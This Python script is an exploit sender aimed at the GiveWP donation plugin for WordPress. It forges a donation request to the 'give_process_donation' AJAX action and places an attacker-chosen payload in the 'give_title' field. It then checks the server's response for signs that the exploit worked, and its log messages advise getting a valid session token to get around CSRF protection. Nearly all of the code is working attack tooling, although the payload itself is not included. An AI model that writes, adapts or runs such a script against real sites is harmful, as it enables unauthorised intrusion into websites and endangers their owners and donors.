import requests
import json
import logging
import random
import string
from bs4 import BeautifulSoup


def generate_random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def send_exploit(url, payload):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    first_name = generate_random_string()
    last_name = generate_random_string()
    email_prefix = generate_random_string()

    data = {
        'give-honeypot': '',
        'give-form-id-prefix': '1719-1',
        'give-form-id': '1719',
        'give-form-title': '0',
        'give-current-url': url,
        'give-form-url': url,
        'give-form-minimum': '',
        'give-form-maximum': '999999.99',
        'give-form-hash': generate_random_string(32),
        'give-price-id': '1',
        'give-amount': '25',
        'give_first': first_name,
        'give_last': last_name,
        'give_email': f'{email_prefix}@test.com',
        'payment-mode': 'manual',
        'give_action': 'purchase',
        'give-gateway': 'manual',
        'give_embed_form': '1',
        'action': 'give_process_donation',
        'give_ajax': 'true',
        'give_title': payload
    }

    logging.info(f"Sending exploit to {url}")
    logging.debug(f"Payload: {payload}")

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)

        logging.info(f"Server responded with status code: {response.status_code}")
        logging.info("Response content:")
        logging.info(response.text[:500])

        analyze_response(response)

    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send exploit: {str(e)}")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {str(e)}")


def analyze_response(response):
    content_type = response.headers.get('Content-Type', '').lower()

    if 'application/json' in content_type:
        analyze_json_response(response.text)
    elif 'text/html' in content_type:
        analyze_html_response(response.text)
    else:
        logging.info(f"Unknown content type: {content_type}")
        analyze_unknown_response(response.text)

    lower_response = response.text.lower()
    if 'success' in lower_response:
        logging.info("The word 'success' was found in the response.")
    if 'error' in lower_response:
        logging.warning("The word 'error' was found in the response.")
    if 'exception' in lower_response or 'fatal' in lower_response:
        logging.warning("Possible server error detected in the response.")

    if response.status_code == 200:
        logging.info("Server responded with a 200 OK status.")
    elif response.status_code >= 400:
        logging.warning(f"Server responded with an error status: {response.status_code}")

    logging.info("Please manually verify the response to determine if the exploit was successful.")


def analyze_json_response(content):
    try:
        json_response = json.loads(content)
        logging.info("Response is in JSON format:")
        logging.info(json.dumps(json_response, indent=4))
    except json.JSONDecodeError:
        logging.warning("Response claims to be JSON but could not be parsed.")
        logging.info("Raw content:")
        logging.info(content)


def analyze_html_response(content):
    soup = BeautifulSoup(content, 'html.parser')
    error_divs = soup.find_all('div', class_='give_error')
    for div in error_divs:
        error_message = div.get_text(strip=True)
        logging.warning(f"Error message found: {error_message}")

    if "malicious" in content.lower():
        logging.info("Possible indication of successful exploit found in HTML response.")
    else:
        logging.info("No clear indication of successful exploit in HTML response.")

    if "unable to recognize your session" in content.lower():
        logging.warning(
            "Session recognition error detected. This may indicate CSRF protection or other security measures.")
        logging.info("Suggestion: Try to obtain a valid session token before sending the exploit.")

    logging.info(f"Response length: {len(content)} characters")
    logging.info(f"Response type: HTML")


def analyze_unknown_response(content):
    logging.info("Response is in an unknown format. Displaying raw content:")
    logging.info(content[:1000])
    logging.info(f"Response length: {len(content)} characters")